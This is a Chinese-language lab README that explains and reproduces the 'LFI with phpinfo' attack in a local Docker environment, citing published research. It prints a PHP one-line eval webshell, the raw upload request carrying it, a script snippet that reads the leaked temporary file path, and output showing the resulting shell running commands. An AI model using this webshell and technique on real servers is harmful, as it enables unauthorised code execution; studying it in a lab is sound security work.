# LFI with phpinfo

原理: 利用php post上传文件产生临时文件，phpinfo()读临时文件的路径和名字，本地包含漏洞生成1句话后门

demo: 源码存放在 code目录下， 利用docker再现

参考：

[http://gynvael.coldwind.pl/download.php?f=PHP_LFI_rfc1867_temporary_files.pdf][1]

[http://www.insomniasec.com/publications/LFI%20With%20PHPInfo%20Assistance.pdf][2]

## php 上传

向服务器上任意php文件**post请求上传文件**时，都会生成临时文件，可以直接在phpinfo页面找到临时文件的路径及名字。

* post上传文件

php post方式上传任意文件，服务器都会创建临时文件来保存文件内容。

在HTTP协议中为了方便进行文件传输，规定了一种基于表单的[ HTML文件传输方法 ][5]

其中要确保上传表单的属性是 enctype=”multipart/form-data，必须用POST 参见: [ php file-upload.post-method ][5] 

其中PHP引擎对enctype=”multipart/form-data”这种请求的处理过程如下：

‍1、请求到达；

‍2、创建临时文件，并写入上传文件的内容；

‍3、调用相应PHP脚本进行处理，如校验名称、大小等；

‍4、删除临时文件。

PHP引擎会首先将文件内容保存到临时文件，然后进行相应的操作。临时文件的名称是 php+随机字符 。

* $_FILES信息，包括临时文件路径、名称

在PHP中，有超全局变量$_FILES,保存上传文件的信息，包括文件名、类型、临时文件名、错误代号、大小


## 手工测试phpinfo()获取临时文件路径

* html表单

文件 upload.html

```
<!doctype html>
<html>
<body>
    <form action="phpinfo.php" method="POST" enctype="multipart/form-data">
    <h3> Test upload tmp file</h3>
    <label for="file">Filename:</label>
    <input type="file" name="file"/><br/>
    <input type="submit" name="submit" value="Submit" />
</form>
</body>
</html>
```

* 浏览器访问 upload.html, 上传文件 file.txt

```
<?php
eval($_REQUEST["cmd"]);
?>
```

* burp 查看POST 信息如下

```
POST /LFI_phpinfo/phpinfo.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1/LFI_phpinfo/upload.html
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------11008921013555437861019615112
Content-Length: 368

-----------------------------11008921013555437861019615112
Content-Disposition: form-data; name="file"; filename="file.txt"
Content-Type: text/plain

<?php
eval($_REQUEST["cmd"]);
?>

-----------------------------11008921013555437861019615112
Content-Disposition: form-data; name="submit"

Submit
-----------------------------11008921013555437861019615112--
```

* phpinfo获得如下信息：

```
_REQUEST["submit"]	
    Submit
    
_POST["submit"]	
    Submit
    
_FILES["file"]	
    Array
    (
        [name] => file.txt
        [type] => text/plain
        [tmp_name] => /tmp/phpufdCHh
        [error] => 0
        [size] => 33
    )
```

得到tmp_name 路径

## python 程序查看

```
import requests

host = '127.0.0.1'
url = 'http://{ip}/LFI_phpinfo/phpinfo.php'.format(ip=host)
file_ = '/var/www/LFI_phpinfo/file.txt'

response = requests.post(url, files={"name": open(file_, 'rb')})

print(response.text)
```

* 结果

```
<tr><td class="e">_FILES["name"]</td><td class="v"><pre>Array
(
    [name] =&gt; file.txt
    [type] =&gt; 
    [tmp_name] =&gt; /tmp/php7EvBv3
    [error] =&gt; 0
    [size] =&gt; 33
)
```

## 临时文件的权限

```
-rw------- 1 www-data www-data 91 Feb 25 18:10 phpkO4ITS
```

## 本地搭建 demo

* get shell

```
$ python lfi_phpinfo.py 127.0.0.1

LFI with phpinfo()
==============================
INFO:__main__:Getting initial offset ...
INFO:__main__:found [tmp_name] at 67801
INFO:__main__:
Got it! Shell created in /tmp/g
INFO:__main__:Wowo! \m/
INFO:__main__:Shutting down...
```

* firefox 访问 

```
http://127.0.0.1/LFI_phpinfo/lfi.php?load=/tmp/gc&f=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
``` 

## docker 构建

* 镜像源

-- [php:5.6-apache 官方源][3]

或

-- [janes/lfi_phpinfo][4]

php:5.6-apache 官方源

```
With Apache
More commonly, you will probably want to run PHP in conjunction with Apache httpd. Conveniently, there's a version of the PHP container that's packaged with the Apache web server.

Create a Dockerfile in your PHP project
FROM php:5.6-apache
COPY src/ /var/www/html/
Where src/ is the directory containing all your php code. Then, run the commands to build and run the Docker image:

$ docker build -t my-php-app .
$ docker run -d --name my-running-app my-php-app
We recommend that you add a custom php.ini configuration. COPY it into /usr/local/etc/php by adding one more line to the Dockerfile above and running the same commands to build and run:

FROM php:5.6-apache
COPY config/php.ini /usr/local/etc/php/
COPY src/ /var/www/html/
Where src/ is the directory containing all your php code and config/ contains your php.ini file.
```

* 构建

切换到web目录下

```
cd web
```

--docker run test

```
docker run --rm -v code/:/var/www/html -p 80:80 php:5.6-apache
```

--docker image build

```
docker build -t "janes/lfi_phpinfo"
docker run --rm -p "80:80" janes/lfi_phpinfo
```

--docker-compose

```
docker-compose up
```

[1]: http://gynvael.coldwind.pl/download.php?f=PHP_LFI_rfc1867_temporary_files.pdf
[2]: http://www.insomniasec.com/publications/LFI%20With%20PHPInfo%20Assistance.pdf
[3]: https://hub.docker.com/_/php/
[4]: https://hub.docker.com/r/janes/lfi_phpinfo/
[5]: http://www.faqs.org/rfcs/rfc1867.html